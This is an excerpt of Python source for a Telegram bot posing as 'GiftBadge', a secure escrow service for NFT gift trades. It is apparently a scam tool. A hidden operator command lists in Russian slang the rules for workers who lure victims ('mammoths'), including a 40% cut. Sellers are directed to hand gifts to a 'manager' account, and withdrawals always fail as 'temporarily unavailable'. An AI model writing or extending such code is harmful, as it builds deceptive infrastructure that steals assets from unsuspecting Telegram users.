...
main_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    ...
    [InlineKeyboardButton(text="📞 Поддержка", url=f"https://t.me/GiftBadge_Support")],
...
currency_keyboard_ru = InlineKeyboardMarkup(inline_keyboard=[
    ...
    [InlineKeyboardButton(text="🇰🇿 KZT", callback_data="currency_KZT"), InlineKeyboardButton(text="🌟 Telegram Stars", callback_data="currency_STARS")],
...
main_keyboard_en = InlineKeyboardMarkup(inline_keyboard=[
    ...
    [InlineKeyboardButton(text="📞 Support", url=f"https://t.me/GiftBadge_Support")],
...
async def send_main_menu(chat_id, lang, message_id=None):
    ...
    if lang == "ru":
        text = ("🎁 <b>GiftBadge | Безопасные сделки</b>\n\n"
        ...
        text = ("🎁 <b>GiftBadge | Secure Deals</b>\n\n"
...
async def sierrateam_command(message: Message):
    ...
    await message.answer(
        "<b>📋 Правила работы через GiftBadge</b>\n\n"
        "1. <b>Наебал на NFT:</b> Если ты написал мамонту кинуть гифт тебе а не менеджеру - БАН.\n"
        "   (Если мамонт кинул NFT тебе сам: либо 40% в течение дня, либо кидаешь гифт на акк менеджеру, либо бан)\n\n"
        "2. <b>Наебал на брейнрота:</b> 40% от стоимости в течение дня, иначе бан\n\n"
        "3. <b>Не прочитал правила:</b> твои проблемы\n\n"
        "📞 <b>Поддержка:</b> @GiftBadge_Support",
...
async def agree_callback(callback: CallbackQuery):
    ...
    if lang == "ru":
        ...
        await safe_edit_message(
            ...
            "📢 <b>Our channel:</b> https://t.me/GiftBadge\n"
            "📞 <b>Support:</b> @GiftBadge_Support\n\n"
...
async def deal_type_callback(callback: CallbackQuery):
    ...
    if lang == "ru":
        ...
        await safe_edit_message(
            callback,
            "🛡️ <b>Creating deal | Gift</b>\n\n"
            "🎁 Enter gift link(s):\n"
            "• Format: https://... or t.me/...\n"
...
async def currency_callback(callback: CallbackQuery):
    ...
    if lang == "ru":
        ...
        await safe_edit_message(
            callback,
            f"🛡️ <b>Creating deal</b>\n\n"
            f"Enter deal amount in {currency}:",
            back_keyboard_en
        )
...
async def profile_callback(callback: CallbackQuery):
    ...
    if lang == "ru":
        await safe_edit_message(
            ...
            f"📞 <b>Поддержка:</b> @GiftBadge_Support",
            profile_keyboard_ru
        )
    else:
        await safe_edit_message(
            ...
            f"📞 <b>Support:</b> @GiftBadge_Support",
            profile_keyboard_en
        )
...
async def withdraw_callback(callback: CallbackQuery):
    ...
    if balance <= 0:
        ...
        if lang == "ru":
            await callback.answer("😔 К сожалению вывод временно недоступен. Обратитесь в поддержку @GiftBadge_Support", show_alert=True)
        else:
            await callback.answer("😔 Unfortunately withdrawal is temporarily unavailable. Contact support @GiftBadge_Support", show_alert=True)
        ...
        if deal.get("status") == "waiting_admin":
            ...
            if seller_lang == "ru":
                await bot.send_message(
                    ...
                    f"💰 <b>Сумма:</b> {deal['amount']} {deal['currency']}\n\n"
                    f"📝 <b>Описание:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>ВАЖНО:</b> Отправьте подарок менеджеру @GiftBadge_Support\n\n"
                ...
                await bot.send_message(
                    ...
                    f"📝 <b>Description:</b>\n{deal['description']}\n\n"
                    f"⚠️ <b>IMPORTANT:</b> Send gift to manager @GiftBadge_Support\n\n"
...
# Запуск бота
async def main():
    print("🎁 GiftBadge Bot запускается...")
